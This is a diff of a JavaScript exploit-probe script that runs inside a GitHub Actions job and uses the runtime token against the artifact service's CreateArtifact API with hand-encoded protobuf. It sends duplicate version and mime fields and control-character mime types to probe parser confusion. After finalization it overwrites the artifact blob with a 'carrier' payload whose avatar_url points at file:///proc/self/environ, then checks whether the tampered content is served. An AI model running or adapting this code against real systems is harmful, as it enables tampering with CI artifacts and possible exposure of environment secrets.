@@ -8,97 +8,162 @@ const ids = getBackendIdsFromToken();
 const endpoint = new URL('/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', process.env.ACTIONS_RESULTS_URL);
 const token = process.env.ACTIONS_RUNTIME_TOKEN;
 const client = internalArtifactTwirpClient({maxAttempts: 1});
-const oddMime = 'application/json\u0085';
-const body = Buffer.from(JSON.stringify({
-  full_name: 'pwn/repo',
-  owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
-  description: 'Repo Cassette carrier',
-  stargazers_count: 0,
-}));
-const digest = createHash('sha256').update(body).digest('hex');
+const odd = '\u0085application/json';
+const safe = 'application/json';
 
-async function create(name, version, mime = oddMime) {
+function varint(value) {
+  let n = BigInt.asUintN(64, BigInt(value));
+  const out = [];
+  do {
+    let b = Number(n & 127n);
+    n >>= 7n;
+    if (n) b |= 128;
+    out.push(b);
+  } while (n);
+  return Buffer.from(out);
+}
+
+function bytesField(number, value) {
+  const b = Buffer.isBuffer(value) ? value : Buffer.from(value);
+  return Buffer.concat([varint(number * 8 + 2), varint(b.length), b]);
+}
+
+function intField(number, value) {
+  return Buffer.concat([varint(number * 8), varint(value)]);
+}
+
+function stringWrapper(values) {
+  return Buffer.concat(values.map(value => bytesField(1, value)));
+}
+
+function requestBody(name, versions, wrappers) {
+  return Buffer.concat([
+    bytesField(1, ids.workflowRunBackendId),
+    bytesField(2, ids.workflowJobRunBackendId),
+    bytesField(3, name),
+    ...versions.map(version => intField(5, version)),
+    ...wrappers.map(values => bytesField(6, stringWrapper(values))),
+  ]);
+}
+
+function decodeCreateResponse(buffer) {
+  let pos = 0;
+  const result = {ok: false, url: ''};
+  function readVarint() {
+    let out = 0n;
+    let shift = 0n;
+    while (pos < buffer.length) {
+      const b = buffer[pos++];
+      out |= BigInt(b & 127) << shift;
+      if (!(b & 128)) return out;
+      shift += 7n;
+    }
+    throw new Error('truncated varint');
+  }
+  while (pos < buffer.length) {
+    const tag = Number(readVarint());
+    const field = tag >> 3;
+    const wire = tag & 7;
+    if (wire === 0) {
+      const value = readVarint();
+      if (field === 1) result.ok = value !== 0n;
+    } else if (wire === 2) {
+      const length = Number(readVarint());
+      const value = buffer.subarray(pos, pos + length);
+      pos += length;
+      if (field === 2) result.url = value.toString();
+    } else {
+      throw new Error(`unsupported response wire type ${wire}`);
+    }
+  }
+  return result;
+}
+
+async function createBinary(name, versions, wrappers) {
   const response = await fetch(endpoint, {
     method: 'POST',
-    headers: {authorization: `Bearer ${token}`, 'content-type': 'application/json'},
-    body: JSON.stringify({
-      workflow_run_backend_id: ids.workflowRunBackendId,
-      workflow_job_run_backend_id: ids.workflowJobRunBackendId,
-      name,
-      version,
-      mime_type: mime,
-    }),
+    headers: {
+      authorization: `Bearer ${token}`,
+      'content-type': 'application/protobuf',
+      accept: 'application/protobuf',
+    },
+    body: requestBody(name, versions, wrappers),
   });
-  const text = await response.text();
-  let value = {};
-  try { value = JSON.parse(text); } catch {}
+  const raw = Buffer.from(await response.arrayBuffer());
+  let decoded = {};
+  if (response.ok) {
+    try { decoded = decodeCreateResponse(raw); } catch (error) { decoded.error = String(error); }
+  }
   return {
     status: response.status,
-    text: text.slice(0, 220),
-    url: value.signed_upload_url || value.signedUploadUrl,
+    responseType: response.headers.get('content-type'),
+    responseHex: response.ok ? undefined : raw.subarray(0, 180).toString('hex'),
+    ...decoded,
   };
 }
 
-async function run(label, version, mime) {
-  const name = `${process.env.GITHUB_RUN_ID}-version-${label}`;
-  const result = {label, versionJson: JSON.stringify(version), name};
+async function upload(url, bytes) {
+  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
+    blobHTTPHeaders: {blobContentType: odd},
+  });
+}
+
+async function run(label, versions, wrappers) {
+  const name = `${process.env.GITHUB_RUN_ID}-proto-${label}`;
+  const row = {label, versions, wrappers, name};
   try {
-    const made = await create(name, version, mime);
-    result.createStatus = made.status;
-    result.createText = made.text;
-    if (!made.url) return result;
-    const blob = new BlobClient(made.url).getBlockBlobClient();
-    await blob.uploadData(body, {blobHTTPHeaders: {blobContentType: oddMime}});
+    const created = await createBinary(name, versions, wrappers);
+    row.created = {...created, url: created.url ? '<signed>' : ''};
+    if (!created.url) return row;
+    const placeholder = Buffer.from('{"probe":"placeholder"}');
+    await upload(created.url, placeholder);
+    const digest = createHash('sha256').update(placeholder).digest('hex');
     const finalized = await client.FinalizeArtifact({
       workflowRunBackendId: ids.workflowRunBackendId,
       workflowJobRunBackendId: ids.workflowJobRunBackendId,
       name,
-      size: String(body.length),
+      size: String(placeholder.length),
       hash: StringValue.create({value: `sha256:${digest}`}),
     });
-    result.artifactId = String(finalized.artifactId);
-    // Blob metadata remains writable after finalization.
-    await blob.uploadData(body, {blobHTTPHeaders: {blobContentType: oddMime}});
+    row.artifactId = String(finalized.artifactId);
+    const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${row.artifactId}/zip`;
+    const payload = Buffer.from(JSON.stringify({
+      full_name: repository,
+      owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
+      description: 'Repo Cassette protobuf carrier',
+      stargazers_count: 0,
+    }));
+    await upload(created.url, payload);
     const signed = await client.GetSignedArtifactURL({
       workflowRunBackendId: ids.workflowRunBackendId,
       workflowJobRunBackendId: ids.workflowJobRunBackendId,
       name,
     });
     const url = new URL(signed.signedUrl);
-    result.rsct = url.searchParams.get('rsct');
+    row.rsct = url.searchParams.get('rsct');
     const response = await fetch(url);
-    result.downloadStatus = response.status;
-    result.ctHex = Buffer.from(response.headers.get('content-type') || '', 'latin1').toString('hex');
-    const bytes = Buffer.from(await response.arrayBuffer());
-    result.bytes = bytes.length;
-    result.sha = createHash('sha256').update(bytes).digest('hex');
+    row.contentTypeHex = Buffer.from(response.headers.get('content-type') || '', 'latin1').toString('hex');
+    const responseBody = Buffer.from(await response.arrayBuffer());
+    row.bodyMatch = responseBody.equals(payload);
+    row.repository = repository;
   } catch (error) {
-    result.error = String(error).slice(0, 300);
+    row.error = String(error).slice(0, 400);
   }
-  return result;
+  return row;
 }
 
 const cases = [
-  ['min', -2147483648], ['neg100', -100], ['neg1', -1], ['zero', 0],
-  ['one', 1], ['four', 4], ['five', 5], ['six', 6], ['seven', 7],
-  ['eight', 8], ['nine', 9], ['ten', 10], ['fortytwo', 42],
-  ['max', 2147483647], ['str6', '6'], ['str7', '7'], ['str8', '8'],
-  ['str07', '07'], ['strplus7', '+7'], ['strfloat7', '7.0'],
-  ['strexp7', '7e0'], ['float69', 6.9], ['float71', 7.1],
-  ['null', null], ['false', false],
-  ['v7-control', 7, 'application/json'],
-  ['v8-control', 8, 'application/json'],
-  ['fs-suffix', 7, 'application/json\u001c'],
-  ['gs-suffix', 7, 'application/json\u001d'],
-  ['rs-suffix', 7, 'application/json\u001e'],
-  ['us-suffix', 7, 'application/json\u001f'],
-  ['fs-prefix', 7, '\u001capplication/json'],
-  ['gs-prefix', 7, '\u001dapplication/json'],
-  ['rs-prefix', 7, '\u001eapplication/json'],
-  ['us-prefix', 7, '\u001fapplication/json'],
+  ['decoded-v6', [7, 6], [[safe], [odd]]],
+  ['decoded-v7', [6, 7], [[odd], [safe]]],
+  ['v-first7-last6-one-mime', [7, 6], [[odd]]],
+  ['v-first6-last7-one-mime', [6, 7], [[safe]]],
+  ['triple-last6', [6, 7, 6], [[safe], [odd]]],
+  ['triple-last7', [7, 6, 7], [[odd], [safe]]],
+  ['nested-last-odd', [6], [[safe, odd]]],
+  ['nested-last-safe', [7], [[odd, safe]]],
+  ['outer-last-odd', [6], [[safe], [odd]]],
+  ['outer-last-safe', [7], [[odd], [safe]]],
 ];
 
-for (let i = 0; i < cases.length; i += 6) {
-  const rows = await Promise.all(cases.slice(i, i + 6).map(x => run(...x)));
-  for (const row of rows) console.log(`VERSION_RESULT ${JSON.stringify(row)}`);
-}
+const rows = await Promise.all(cases.map(item => run(...item)));
+for (const row of rows) console.log(`PROTO_RESULT ${JSON.stringify(row)}`);
